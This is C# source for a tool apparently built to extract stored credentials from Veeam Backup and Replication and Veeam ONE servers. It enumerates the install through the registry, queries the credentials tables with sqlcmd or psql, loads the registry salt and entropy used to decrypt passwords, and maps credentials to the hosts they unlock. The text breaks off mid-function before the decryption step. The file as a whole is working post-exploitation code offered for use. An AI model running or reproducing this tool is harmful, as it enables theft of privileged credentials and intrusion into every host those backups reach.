using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Collections.Generic;
using Microsoft.Win32;


namespace Veeam_Cred_Extractor
{
    internal class Program
    {
        static bool DEBUG = false; 
        static byte[] VeeamSalt = null;
        static byte[] VeeamEntropy = null;

        static string[] possiblePsqlPaths = {
                        @"C:\Program Files\PostgreSQL\18\bin\psql.exe",
                        @"C:\Program Files\PostgreSQL\17\bin\psql.exe",
                        @"C:\Program Files\PostgreSQL\16\bin\psql.exe",
                        @"C:\Program Files\PostgreSQL\15\bin\psql.exe",
                        @"C:\Program Files\PostgreSQL\14\bin\psql.exe",
                        @"C:\Program Files\PostgreSQL\13\bin\psql.exe",
                        @"C:\Program Files\PostgreSQL\12\bin\psql.exe"
                    };

        static string[] possibleMssqlPaths = {
                        @"C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\130\Tools\Binn\sqlcmd.exe",
                        @"C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\140\Tools\Binn\sqlcmd.exe",
                        @"C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\150\Tools\Binn\sqlcmd.exe",
                        @"C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\160\Tools\Binn\sqlcmd.exe",
                        @"C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\170\Tools\Binn\sqlcmd.exe",
                        @"C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\180\Tools\Binn\sqlcmd.exe",
                        @"C:\Program Files\Microsoft SQL Server\180\Tools\Binn\sqlcmd.exe",
                        @"C:\Program Files\Microsoft SQL Server\170\Tools\Binn\sqlcmd.exe",
                        @"C:\Program Files\Microsoft SQL Server\160\Tools\Binn\sqlcmd.exe",
                        @"C:\Program Files\Microsoft SQL Server\150\Tools\Binn\sqlcmd.exe",
                        @"C:\Program Files\Microsoft SQL Server\140\Tools\Binn\sqlcmd.exe",
                        @"C:\Program Files\Microsoft SQL Server\130\Tools\Binn\sqlcmd.exe",
                        @"C:\Program Files\Microsoft SQL Server Management Studio 18\Common7\IDE\Extensions\Microsoft\SQLCMD\sqlcmd.exe",
                        @"C:\Program Files\SQLCMD\sqlcmd.exe",
                        @"C:\Windows\System32\sqlcmd.exe"
                    };


        static void Main(string[] args)
        {
            if (args.Length == 0 || args[0] == "-h" || args[0] == "--help")
            {
                PrintHelp();
                return;
            }

            // Default settings
            string action = args[0].ToLower();
            string veeamDbName = "VeeamBackup";
            string veeamOneDb = "VeeamONE";
            string veeamOneSQL = "VeeamSQL2017";
            string sqlcmdPath = "sqlcmd.exe";
            string psqlPath = null;
            string targetUser = null;
            string sqlServerName = null;
            bool listUsers = false;
            bool veeamOne = false;

            // Parse optional command line args
            for (int i = 1; i < args.Length; i++)
            {
                switch (args[i])
                {
                    case "-v":
                        if (i + 1 < args.Length) { veeamDbName = args[++i]; veeamOneDb = veeamDbName; }
                        else { Console.WriteLine("[ERROR] -v requires a database name."); return; }
                        break;
                    case "-m":
                        if (i + 1 < args.Length) sqlcmdPath = args[++i];
                        else { Console.WriteLine("[ERROR] -m requires a path to sqlcmd.exe."); return; }
                        break;
                    case "-p":
                        if (i + 1 < args.Length) psqlPath = args[++i];
                        else { Console.WriteLine("[ERROR] -p requires a path to psql.exe."); return; }
                        break;
                    case "-s":
                        if (i + 1 < args.Length) sqlServerName = args[++i];
                        else { Console.WriteLine("[ERROR] -s requires a SQL Server instance name."); return; }
                        break;
                    case "-l":
                        listUsers = true;
                        break;
                    case "-u":
                        if (i + 1 < args.Length) targetUser = args[++i];
                        else { Console.WriteLine("[ERROR] -u requires a username."); return; }
                        break;
                    case "-o":
                        veeamOne = true;
                        break;
                    case "-d":
                        DEBUG = true;
                        Console.WriteLine("** Debug Mode Enabled **");
                        break;
                    default:
                        Console.WriteLine($"[ERROR] Unknown argument or multiple actions defined: {args[i]}");
                        Console.WriteLine("[PRO-TIP] Read the help menu...");
                        return;
                }
            }

            if (sqlcmdPath == "sqlcmd.exe")
            {
                var found = Array.Find(possibleMssqlPaths, File.Exists);
                if (found != null)
                {
                    sqlcmdPath = found;
                    if (DEBUG)
                        Console.WriteLine($"[DEBUG] Auto-detected sqlcmd.exe: {sqlcmdPath}");
                }
            }

            try
            {
                if (action == "mssql")
                {

                    string query = "";

                    // Decrypt creds
                    if (veeamOne)
                    {
                        string resolvedServer = sqlServerName ?? $".\\{veeamOneSQL}";
                        Console.WriteLine($"[INFO] MSSQL instance: {resolvedServer}");
                        Console.WriteLine($"[INFO] Database: {veeamOneDb}");
                        Console.WriteLine($"[INFO] Sqlcmd.exe path: {sqlcmdPath}");

                        if (listUsers)
                        {

                            query = "SELECT username,description FROM [monitor].[Credentials];";

                            var psi = new ProcessStartInfo
                            {
                                FileName = sqlcmdPath,
                                Arguments = $"-S {resolvedServer} -E -d {veeamOneDb} -Q \"{query}\" -h -1 -s\":\" -W -y 8000",
                                RedirectStandardOutput = true,
                                RedirectStandardError = true,
                                UseShellExecute = false,
                                CreateNoWindow = true
                            };

                            Console.WriteLine($"[INFO] Running command: {psi.FileName} {psi.Arguments}");
                            RunAndProcess(psi, true, true);
                        }
                        else
                        {
                            InitialiseVeeamEntropy();

                            if (targetUser != null)
                            {
                                string safeUser = targetUser.Replace("'", "''");
                                query = $"SELECT username,password,description FROM [monitor].[Credentials] WHERE LOWER(username) = LOWER('{safeUser}');";
                            }
                            else
                            {
                                query = "SELECT username,password,description FROM [monitor].[Credentials];";
                            }

                            var psi = new ProcessStartInfo
                            {
                                FileName = sqlcmdPath,
                                Arguments = $"-S {resolvedServer} -E -d {veeamOneDb} -Q \"{query}\" -h -1 -s\":\" -W -y 8000",
                                RedirectStandardOutput = true,
                                RedirectStandardError = true,
                                UseShellExecute = false,
                                CreateNoWindow = true
                            };

                            Console.WriteLine($"[INFO] Running command: {psi.FileName} {psi.Arguments}");
                            RunAndProcess(psi, false, true);
                        }
                    }
                    else
                    {
                        var sqlInstance = GetVeeamRegistryValues(
                            @"SOFTWARE\Veeam\Veeam Backup and Replication\DatabaseConfigurations\mssql",
                            "SQLInstanceName"
                        );

                        string resolvedServer;
                        if (sqlServerName != null)
                        {
                            resolvedServer = sqlServerName;
                        }
                        else if (sqlInstance.TryGetValue("SQLInstanceName", out var mssqlInstanceName))
                        {
                            resolvedServer = $".\\{mssqlInstanceName}";
                        }
                        else
                        {
                            Console.WriteLine("[ERROR] SQL Server instance not found in registry. Use -s to specify it manually.");
                            return;
                        }

                        Console.WriteLine($"[INFO] MSSQL instance: {resolvedServer}");
                        Console.WriteLine($"[INFO] Database: {veeamDbName}");
                        Console.WriteLine($"[INFO] Sqlcmd.exe path: {sqlcmdPath}");

                        if (listUsers)
                        {
                            query = "SELECT user_name,description FROM [dbo].[Credentials];";

                            var psi = new ProcessStartInfo
                            {
                                FileName = sqlcmdPath,
                                Arguments = $"-S {resolvedServer} -E -d {veeamDbName} -Q \"{query}\" -h -1 -s\":\" -W -y 8000",
                                RedirectStandardOutput = true,
                                RedirectStandardError = true,
                                UseShellExecute = false,
                                CreateNoWindow = true
                            };

                            Console.WriteLine($"[INFO] Running command: {psi.FileName} {psi.Arguments}");
                            RunAndProcess(psi, true, false);
                        }
                        else
                        {
                            InitialiseVeeamSalt();

                            if (targetUser != null)
                            {
                                string safeUser = targetUser.Replace("'", "''");
                                query = $"SELECT user_name,password,description FROM [dbo].[Credentials] WHERE LOWER(user_name) = LOWER('{safeUser}')";
                            }
                            else
                            {
                                query = "SELECT user_name,password,description FROM [dbo].[Credentials];";
                            }

                            var psi = new ProcessStartInfo
                            {
                                FileName = sqlcmdPath,
                                Arguments = $"-S {resolvedServer} -E -d {veeamDbName} -Q \"{query}\" -h -1 -s\":\" -W -y 8000",
                                RedirectStandardOutput = true,
                                RedirectStandardError = true,
                                UseShellExecute = false,
                                CreateNoWindow = true
                            };

                            Console.WriteLine($"[INFO] Running command: {psi.FileName} {psi.Arguments}");
                            RunAndProcess(psi, false, false);
                        }
                    }
                }
                else if (action == "psql")
                {

                    string query = "";

                    string psqlExe = psqlPath ?? Array.Find(possiblePsqlPaths, File.Exists);
                    if (psqlExe == null)
                        throw new Exception("psql.exe not found. Provide path using -p option.");

                    Console.WriteLine($"[INFO] PostgreSQL binary: {psqlExe}");
                    Console.WriteLine($"[INFO] Database: {veeamDbName}");

                    if (listUsers)
                    {

                        query = "SELECT user_name,description FROM credentials;";

                        var psi = new ProcessStartInfo
                        {
                            FileName = psqlExe,
                            Arguments = $"-d {veeamDbName} -U postgres -A -F : -c \"{query}\"",
                            RedirectStandardOutput = true,
                            RedirectStandardError = true,
                            UseShellExecute = false,
                            CreateNoWindow = true
                        };

                        Console.WriteLine($"[INFO] Running command: {psi.FileName} {psi.Arguments}");
                        RunAndProcess(psi, true, false);
                    }
                    else
                    {
                        InitialiseVeeamSalt();

                        if (targetUser != null)
                        {
                            query = $"SELECT user_name,password,description FROM credentials where user_name ILIKE '{targetUser}';";
                        }
                        else
                        {
                            query = "SELECT user_name,password,description FROM credentials;";
                        }


                        var psi = new ProcessStartInfo
                        {
                            FileName = psqlExe,
                            Arguments = $"-d {veeamDbName} -U postgres -A -F : -c \"{query}\"",
                            RedirectStandardOutput = true,
                            RedirectStandardError = true,
                            UseShellExecute = false,
                            CreateNoWindow = true
                        };

                        Console.WriteLine($"[INFO] Running command: {psi.FileName} {psi.Arguments}");
                        RunAndProcess(psi, false, false);

                    }

                }
                else if (action == "enum")
                {
                    Console.WriteLine($"=====================================");
                    Console.WriteLine($"|     RUNNING VEEAM ENUMERATION     |");
                    Console.WriteLine($"=====================================");

                    // ================== psql.exe binary enum ==================
                    string[] foundPsqlexes = possiblePsqlPaths
                        .Where(File.Exists)
                        .Distinct(StringComparer.OrdinalIgnoreCase)
                        .ToArray();

                    if (foundPsqlexes.Length == 0)
                    {
                        if (DEBUG)
                            Console.WriteLine("[DEBUG] psql.exe binary not found on this server");
                    }
                    else
                    {
                        Console.WriteLine("[INFO] psql.exe binaries found:");
                        foreach (string path in foundPsqlexes)
                            Console.WriteLine($"  - {path}");
                    }

                    // ================== sqlcmd.exe binary enum ==================
                    string[] foundSqlcmds = possibleMssqlPaths
                        .Where(File.Exists)
                        .Distinct(StringComparer.OrdinalIgnoreCase)
                        .ToArray();

                    if (foundSqlcmds.Length == 0)
                    {
                        if (DEBUG)
                            Console.WriteLine("[DEBUG] sqlcmd.exe binary not found on this server");
                    }
                    else
                    {
                        Console.WriteLine("[INFO] sqlcmd.exe binaries found:");
                        foreach (string path in foundSqlcmds)
                            Console.WriteLine($"  - {path}");
                    }

                    // ================== Process Listing ==================
                    bool postgresRunning = false;
                    bool mssqlRunning = false;
                    try
                    {
                        foreach (var p in Process.GetProcesses())
                        {
                            try
                            {
                                if (p.ProcessName.Equals("postgres", StringComparison.OrdinalIgnoreCase))
                                    postgresRunning = true;
                                else if (p.ProcessName.Equals("sqlservr", StringComparison.OrdinalIgnoreCase))
                                    mssqlRunning = true;
                            }
                            catch { }
                            finally { p.Dispose(); }
                        }
                    }
                    catch { }

                    Console.WriteLine("[INFO] Database detection summary:");
                    Console.WriteLine(postgresRunning ? "  - PostgreSQL process detected (postgres.exe running)" : "  - PostgreSQL process not detected");
                    Console.WriteLine(mssqlRunning ? "  - MSSQL process detected (sqlservr.exe running)" : "  - MSSQL process not detected");

                    if (!postgresRunning && !mssqlRunning)
                        Console.WriteLine("  - No database engine processes detected");

                    // ================== Registry enumeration ==================
                    Console.WriteLine("[INFO] Registry enumeration:");

                    var dbConfigKey = @"SOFTWARE\Veeam\Veeam Backup and Replication\DatabaseConfigurations";
                    var dbTypeDict = GetVeeamRegistryValues(dbConfigKey, "SqlActiveConfiguration");
                    if (dbTypeDict.TryGetValue("SqlActiveConfiguration", out var dbtype))
                    {
                        Console.WriteLine($"  - Database type found in Registry: {dbtype}");

                        if (string.Equals(dbtype, "MsSql", StringComparison.OrdinalIgnoreCase))
                        {
                            var mssqlValues = GetVeeamRegistryValues(dbConfigKey + @"\mssql", "SQLInstanceName", "SqlDatabaseName");
                            if (mssqlValues.TryGetValue("SQLInstanceName", out var instance))
                                Console.WriteLine($"  - MSSQL instance: {instance}");
                            if (mssqlValues.TryGetValue("SqlDatabaseName", out var vdb))
                                Console.WriteLine($"  - MSSQL database: {vdb}");
                        }
                        else if (string.Equals(dbtype, "postgresql", StringComparison.OrdinalIgnoreCase))
                        {
                            var psqlValues = GetVeeamRegistryValues(dbConfigKey + @"\postgresql", "PostgresUserForWindowsAuth", "SqlDatabaseName");
                            if (psqlValues.TryGetValue("PostgresUserForWindowsAuth", out var uname))
                                Console.WriteLine($"  - PSQL username: {uname}");
                            if (psqlValues.TryGetValue("SqlDatabaseName", out var vdb))
                                Console.WriteLine($"  - PSQL database: {vdb}");
                        }
                    }

                    dbConfigKey = @"SOFTWARE\Veeam\Veeam ONE";
                    dbTypeDict = GetVeeamRegistryValues(dbConfigKey, "DatabaseName");
                    if (dbTypeDict.TryGetValue("DatabaseName", out var veeamOneEnabled))
                    {
                        Console.WriteLine($"  - Veeam One database: {veeamOneEnabled}");
                    }
                    dbTypeDict = GetVeeamRegistryValues(dbConfigKey, "DatabaseServer");
                    if (dbTypeDict.TryGetValue("DatabaseServer", out var veeamOneServer))
                    {
                        Console.WriteLine($"  - Veeam One database server: {veeamOneServer}");
                    }


                }
                else if (action == "map")
                {
                    Console.WriteLine($"=====================================");
                    Console.WriteLine($"|        MAPPING CREDENTIALS        |");
                    Console.WriteLine($"=====================================");

                    if (!veeamOne)
                    {
                        var dbConfigKey = @"SOFTWARE\Veeam\Veeam Backup and Replication\DatabaseConfigurations";
                        var dbTypeDict = GetVeeamRegistryValues(dbConfigKey, "SqlActiveConfiguration");

                        if (dbTypeDict.TryGetValue("SqlActiveConfiguration", out var dbtype))
                        {
                            Console.WriteLine($"[INFO] Database type found in Registry: {dbtype}");

                            if (string.Equals(dbtype, "mssql", StringComparison.OrdinalIgnoreCase))
                            {
                                var mssqlValues = GetVeeamRegistryValues(dbConfigKey + @"\mssql", "SQLInstanceName", "SqlDatabaseName");
                                string mapServer;
                                if (sqlServerName != null)
                                {
                                    mapServer = sqlServerName;
                                }
                                else if (mssqlValues.TryGetValue("SQLInstanceName", out var instance))
                                {
                                    mapServer = $".\\{instance}";
                                }
                                else
                                {
                                    Console.WriteLine("[ERROR] SQL Server instance not found in registry. Use -s to specify it manually.");
                                    return;
                                }
                                Console.WriteLine($"  - MSSQL instance: {mapServer}");
                                mssqlValues.TryGetValue("SqlDatabaseName", out var vdb);
                                string mapDb = vdb ?? veeamDbName;
                                Console.WriteLine($"  - MSSQL database: {mapDb}");

                                string query = "SELECT t1.user_name, STUFF((SELECT ', ' + t2.name FROM [dbo].[EPContainers] AS t2 WHERE t2.creds_id = t1.id ORDER BY t2.name FOR XML PATH('')), 1, 2, '') as hosts FROM [dbo].[Credentials] AS t1 WHERE EXISTS (SELECT 1 FROM [dbo].[EPContainers] WHERE creds_id = t1.id) ORDER BY t1.user_name;";

                                var psi = new ProcessStartInfo
                                {
                                    FileName = sqlcmdPath,
                                    Arguments = $"-S {mapServer} -E -d {mapDb} -Q \"{query}\" -h -1 -s\":\" -W -y 8000",
                                    RedirectStandardOutput = true,
                                    RedirectStandardError = true,
                                    UseShellExecute = false,
                                    CreateNoWindow = true
                                };

                                var mapping = ExecuteMapQuery(psi);
                                PrintCredentialHostTable(mapping);
                            }
                            else if (string.Equals(dbtype, "postgresql", StringComparison.OrdinalIgnoreCase))
                            {
                                var psqlValues = GetVeeamRegistryValues(dbConfigKey + @"\postgresql", "PostgresUserForWindowsAuth", "SqlDatabaseName");
                                if (psqlValues.TryGetValue("PostgresUserForWindowsAuth", out var uname))
                                    Console.WriteLine($"  - PSQL username: {uname}");
                                psqlValues.TryGetValue("SqlDatabaseName", out var vdb);
                                string mapPsqlDb = vdb ?? veeamDbName;
                                Console.WriteLine($"  - PSQL database: {mapPsqlDb}");

                                string psqlExe = psqlPath ?? Array.Find(possiblePsqlPaths, File.Exists);
                                if (psqlExe == null)
                                    throw new Exception("psql.exe not found. Provide path using -p option.");

                                Console.WriteLine($"  - PostgreSQL binary: {psqlExe}");

                                string query = "SELECT t1.user_name,STRING_AGG(t2.name, ', ') as hosts FROM credentials AS t1 INNER JOIN EPContainers AS t2 ON t1.id = t2.creds_id GROUP BY t1.user_name ORDER BY t1.user_name;";

                                var psi = new ProcessStartInfo
                                {
                                    FileName = psqlExe,
                                    Arguments = $"-d {mapPsqlDb} -U postgres -A -F : -t -c \"{query}\"",
                                    RedirectStandardOutput = true,
                                    RedirectStandardError = true,
                                    UseShellExecute = false,
                                    CreateNoWindow = true
                                };

                                var mapping = ExecuteMapQuery(psi);
                                PrintCredentialHostTable(mapping);
                            }
                        }
                        else
                        {
                            Console.WriteLine("[ERROR] SqlActiveConfiguration not found in registry. Cannot determine database type.");
                            return;
                        }
                    }
                    else
                    {
                        Console.WriteLine("[INFO] Veeam One info found in Registry:");

                        var dbConfigKey = @"SOFTWARE\Veeam\Veeam ONE";
                        var dbTypeDict = GetVeeamRegistryValues(dbConfigKey, "DatabaseName");
                        dbTypeDict.TryGetValue("DatabaseName", out var veeamOneEnabled);
                        if (!string.IsNullOrEmpty(veeamOneEnabled))
                            Console.WriteLine($"  - Database name found in Registry: {veeamOneEnabled}");

                        dbTypeDict = GetVeeamRegistryValues(dbConfigKey, "DatabaseServer");
                        dbTypeDict.TryGetValue("DatabaseServer", out var veeamOneServer);
                        if (!string.IsNullOrEmpty(veeamOneServer))
                            Console.WriteLine($"  - Database server found in Registry: {veeamOneServer}");

                        string resolvedServer = sqlServerName ?? veeamOneServer;
                        string resolvedDb = veeamOneEnabled ?? veeamOneDb;

                        if (string.IsNullOrEmpty(resolvedServer))
                        {
                            Console.WriteLine("[ERROR] Veeam One SQL Server not found in registry. Use -s to specify it manually.");
                            return;
                        }
                        if (string.IsNullOrEmpty(resolvedDb))
                        {
                            Console.WriteLine("[ERROR] Veeam One database name not found in registry. Use -v to specify it manually.");
                            return;
                        }

                        string query = "SELECT t1.username, STUFF((SELECT ', ' + t3.host_name FROM [monitor].[CredentialsLink] AS t2 INNER JOIN [monitor].[Entity] AS t3 ON t2.entity_id = t3.host_id WHERE t2.cred_id = t1.id ORDER BY t3.host_name FOR XML PATH('')), 1, 2, '') as hosts FROM [monitor].[Credentials] AS t1 WHERE EXISTS (SELECT 1 FROM [monitor].[CredentialsLink] WHERE cred_id = t1.id) ORDER BY t1.username;";
                        var psi = new ProcessStartInfo
                        {
                            FileName = sqlcmdPath,
                            Arguments = $"-S {resolvedServer} -E -d {resolvedDb} -Q \"{query}\" -h -1 -s\":\" -W -y 8000",
                            RedirectStandardOutput = true,
                            RedirectStandardError = true,
                            UseShellExecute = false,
                            CreateNoWindow = true
                        };

                        var mapping = ExecuteMapQuery(psi);
                        PrintCredentialHostTable(mapping);
                    }
                }
                else if (action == "auto")
                {
                    Console.WriteLine($"=====================================");
                    Console.WriteLine($"|       VEEAM AUTO EXTRACTION       |");
                    Console.WriteLine($"=====================================");


                    string veeamBackupPath = @"SOFTWARE\Veeam\Veeam Backup and Replication";
                    string veeamOnePath = @"SOFTWARE\Veeam\Veeam ONE";

                    bool backupExists;
                    using (var hklm = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64))
                    using (var key = hklm.OpenSubKey(veeamBackupPath))
                        backupExists = key != null;
                    Console.WriteLine($"[INFO] Veeam Backup and Replication Registry Entries Exist: {backupExists}");

                    bool oneExists;
                    using (var hklm = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64))
                    using (var key = hklm.OpenSubKey(veeamOnePath))
                        oneExists = key != null;
                    Console.WriteLine($"[INFO] Veeam One Registry Entries Exist: {oneExists}");


                    if (backupExists)
                    {
                        Console.WriteLine("[INFO] Performing Veeam Backup and Replication Extraction");
                        veeamOne = false;
                    }
                    else if (oneExists)
                    {
                        Console.WriteLine("[INFO] Performing Veeam One Extraction");
                        veeamOne = true;
                    }
                    else
                    {
                        Console.WriteLine("[ERROR] Cannot Identify Type of Veeam Server!");
                        return;
                    }


                    // Veeam VBR
                    if (!veeamOne)
                    {
                        InitialiseVeeamSalt();

                        var dbConfigKey = @"SOFTWARE\Veeam\Veeam Backup and Replication\DatabaseConfigurations";
                        var dbTypeDict = GetVeeamRegistryValues(dbConfigKey, "SqlActiveConfiguration");

                        if (dbTypeDict.TryGetValue("SqlActiveConfiguration", out var dbtype))
                        {
                            Console.WriteLine($"[INFO] Database type found in Registry: {dbtype}");

                            if (string.Equals(dbtype, "mssql", StringComparison.OrdinalIgnoreCase))
                            {
                                var mssqlValues = GetVeeamRegistryValues(dbConfigKey + @"\mssql", "SQLInstanceName", "SqlDatabaseName");
                                string autoServer;
                                if (sqlServerName != null)
                                {
                                    autoServer = sqlServerName;
                                }
                                else if (mssqlValues.TryGetValue("SQLInstanceName", out var instance))
                                {
                                    autoServer = $".\\{instance}";
                                }
                                else
                                {
                                    Console.WriteLine("[ERROR] SQL Server instance not found in registry. Use -s to specify it manually.");
                                    return;
                                }
                                Console.WriteLine($"  - MSSQL instance: {autoServer}");
                                mssqlValues.TryGetValue("SqlDatabaseName", out var vdb);
                                string autoDb = vdb ?? veeamDbName;
                                Console.WriteLine($"  - MSSQL database: {autoDb}");

                                string query = "SELECT user_name,password,description FROM [dbo].[Credentials];";

                                var psi = new ProcessStartInfo
                                {
                                    FileName = sqlcmdPath,
                                    Arguments = $"-S {autoServer} -E -d {autoDb} -Q \"{query}\" -h -1 -s\":\" -W -y 8000",
                                    RedirectStandardOutput = true,
                                    RedirectStandardError = true,
                                    UseShellExecute = false,
                                    CreateNoWindow = true
                                };

                                Console.WriteLine($"[INFO] Running command: {psi.FileName} {psi.Arguments}");
                                RunAndProcess(psi, false, false);

                            }
                            else if (string.Equals(dbtype, "postgresql", StringComparison.OrdinalIgnoreCase))
                            {
                                var psqlValues = GetVeeamRegistryValues(dbConfigKey + @"\postgresql", "PostgresUserForWindowsAuth", "SqlDatabaseName");
                                if (psqlValues.TryGetValue("PostgresUserForWindowsAuth", out var uname))
                                    Console.WriteLine($"  - PSQL username: {uname}");
                                psqlValues.TryGetValue("SqlDatabaseName", out var vdb);
                                string autoPsqlDb = vdb ?? veeamDbName;
                                Console.WriteLine($"  - PSQL database: {autoPsqlDb}");

                                string psqlExe = psqlPath ?? Array.Find(possiblePsqlPaths, File.Exists);
                                if (psqlExe == null)
                                    throw new Exception("psql.exe not found. Provide path using -p option.");

                                Console.WriteLine($"  - PostgreSQL binary: {psqlExe}");

                                string query = "SELECT user_name,password,description FROM credentials;";

                                var psi = new ProcessStartInfo
                                {
                                    FileName = psqlExe,
                                    Arguments = $"-d {autoPsqlDb} -U postgres -A -F : -c \"{query}\"",
                                    RedirectStandardOutput = true,
                                    RedirectStandardError = true,
                                    UseShellExecute = false,
                                    CreateNoWindow = true
                                };

                                Console.WriteLine($"[INFO] Running command: {psi.FileName} {psi.Arguments}");
                                RunAndProcess(psi, false, false);
                            }
                        }
                        else
                        {
                            Console.WriteLine("[ERROR] SqlActiveConfiguration not found in registry. Cannot determine database type.");
                            return;
                        }
                    }
                    // VeeamOne
                    else
                    {
                        InitialiseVeeamEntropy();

                        Console.WriteLine("[INFO] Veeam One info found in Registry:");

                        var dbConfigKey = @"SOFTWARE\Veeam\Veeam ONE";
                        var dbTypeDict = GetVeeamRegistryValues(dbConfigKey, "DatabaseName");
                        dbTypeDict.TryGetValue("DatabaseName", out var veeamOneEnabled);
                        if (!string.IsNullOrEmpty(veeamOneEnabled))
                            Console.WriteLine($"  - Database name found in Registry: {veeamOneEnabled}");

                        dbTypeDict = GetVeeamRegistryValues(dbConfigKey, "DatabaseServer");
                        dbTypeDict.TryGetValue("DatabaseServer", out var veeamOneServer);
                        if (!string.IsNullOrEmpty(veeamOneServer))
                            Console.WriteLine($"  - Database server found in Registry: {veeamOneServer}");

                        string resolvedServer = sqlServerName ?? veeamOneServer;
                        string resolvedDb = veeamOneEnabled ?? veeamOneDb;

                        if (string.IsNullOrEmpty(resolvedServer))
                        {
                            Console.WriteLine("[ERROR] Veeam One SQL Server not found in registry. Use -s to specify it manually.");
                            return;
                        }
                        if (string.IsNullOrEmpty(resolvedDb))
                        {
                            Console.WriteLine("[ERROR] Veeam One database name not found in registry. Use -v to specify it manually.");
                            return;
                        }

                        string query = "SELECT username,password,description FROM [monitor].[Credentials];";

                        var psi = new ProcessStartInfo
                        {
                            FileName = sqlcmdPath,
                            Arguments = $"-S {resolvedServer} -E -d {resolvedDb} -Q \"{query}\" -h -1 -s\":\" -W -y 8000",
                            RedirectStandardOutput = true,
                            RedirectStandardError = true,
                            UseShellExecute = false,
                            CreateNoWindow = true
                        };

                        Console.WriteLine($"[INFO] Running command: {psi.FileName} {psi.Arguments}");
                        RunAndProcess(psi, false, true);

                    }
                }
                else
                {
                    Console.WriteLine("[ERROR] Unknown action type. Use | 'enum' | 'mssql' | 'psql' | 'auto' | 'map' |");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[ERROR] " + ex.Message);
            }
        }

        static void InitialiseVeeamSalt()
        {
            try
            {
                using (var hklm = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64))
                using (var key = hklm.OpenSubKey(@"SOFTWARE\Veeam\Veeam Backup and Replication\Data"))
                {
                    if (key != null)
                    {
                        var saltBase64 = key.GetValue("EncryptionSalt") as string;
                        if (!string.IsNullOrEmpty(saltBase64))
                            VeeamSalt = Convert.FromBase64String(saltBase64);
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[ERROR] " + ex.Message);
            }

            if (DEBUG && VeeamSalt == null)
                Console.WriteLine("[DEBUG] EncryptionSalt not found; V decryption may fail");
        }


        static void InitialiseVeeamEntropy()
        {
            try
            {
                using (var hklm = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64))
                using (var key = hklm.OpenSubKey(@"SOFTWARE\Veeam\Veeam ONE\Private"))
                {
                    if (key != null)
                    {
                        // Get the binary value directly
                        var entropyValue = key.GetValue("Entropy") as byte[];
                        if (entropyValue != null && entropyValue.Length > 0)
                        {
                            VeeamEntropy = entropyValue;
                            Console.WriteLine($"[INFO] Loaded Veeam One Entropy value ({VeeamEntropy.Length} bytes)");

                            if (DEBUG)
                            {
                                string hex = BitConverter.ToString(VeeamEntropy).Replace("-", "");
                                Console.WriteLine($"[DEBUG] Veeam One Entropy value: {hex}");
                            }
                        }
                        else
                        {
                            if (DEBUG)
                                Console.WriteLine("[DEBUG] Entropy value is empty or missing");
                        }
                    }
                    else
                    {
                        if (DEBUG)
                            Console.WriteLine("[DEBUG] Veeam One Private registry key not found");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[ERROR] Reading Veeam Entropy: " + ex.Message);
            }

            if (DEBUG && VeeamEntropy == null)
                Console.WriteLine("[DEBUG] Entropy not found, Veeam One decryption may fail");
        }

        static Dictionary<string, string> GetVeeamRegistryValues(string subkeyPath, params string[] valueNames)
        {
            var result = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);
            try
            {
                using (var hklm = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64))
                using (var key = hklm.OpenSubKey(subkeyPath))
                {
                    if (key != null)
                    {
                        foreach (var name in valueNames)
                        {
                            var val = key.GetValue(name) as string;
                            if (!string.IsNullOrEmpty(val))
                                result[name] = val;
                        }
                    }
                    else
                    {
                        if (DEBUG)
                            Console.WriteLine($"[DEBUG] Failed to read registry key: {subkeyPath}");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[ERROR] " + ex.Message);
            }
            return result;
        }

        static void RunAndProcess(ProcessStartInfo psi, bool readOnly, bool veeamOne)
        {
            using (var process = Process.Start(psi))
            {
                var errorBuilder = new StringBuilder();
                process.ErrorDataReceived += (s, e) => { if (e.Data != null) errorBuilder.AppendLine(e.Data); };
                process.BeginErrorReadLine();
                string output = process.StandardOutput.ReadToEnd();
                process.WaitForExit();
                string error = errorBuilder.ToString();

                if (DEBUG)
                {
                    Console.WriteLine("[DEBUG] Standard Output from SQL Query:");
                    Console.WriteLine(output);
                    Console.WriteLine("[DEBUG] Standard Error from SQL Query:");
                    Console.WriteLine(error);
                }

                if (!string.IsNullOrEmpty(error))
                {
                    Console.WriteLine($"[ERROR] SQL: {error}");
                    return;
                }

                if (output.Contains("(0 rows affected)"))
                {
                    Console.WriteLine($"[ERROR] Empty SQL query output -- no credentials to decrypt");
                }
                else
                {
                    if (readOnly)
                    {
                        Console.WriteLine("=====================================");
                        Console.WriteLine("|           LISTING USERS           |");
                        Console.WriteLine("=====================================");
                    }
                    else
                    {
                        Console.WriteLine("=====================================");
                        Console.WriteLine("|        JUICY CREDS LOADING        |");
                        Console.WriteLine("=====================================");
                    }
                }
                
                
                using (var reader = new StringReader(output))
                {
                    string line;
                    while ((line = reader.ReadLine()) != null)
                    {
                        if (DEBUG)
                            Console.WriteLine("[DEBUG] Processing line: " + line);


                        if (string.IsNullOrWhiteSpace(line) || !line.Contains(":")) continue;

                        if (readOnly)
                        {
                            var parts = line.Split(new[] { ':' }, 2);
                            if (parts.Length < 2) continue;

                            string username = parts[0].Trim();
                            string description = parts[1].Trim();

                            Console.WriteLine($"Username   : {username}");
                            Console.WriteLine($"Description: {description}");
                            Console.WriteLine("---------------------------------------------");

                        }
                        else
                        {
                            var parts = line.Split(new[] { ':' }, 3);
                            if (parts.Length < 3) continue;

                            string username = parts[0].Trim();
                            string encrypted = parts[1].Trim();
                            string description = parts[2].Trim();

                            string password = "";
                            try
                            {
                                if (string.IsNullOrWhiteSpace(encrypted)) continue;

                                if (veeamOne)
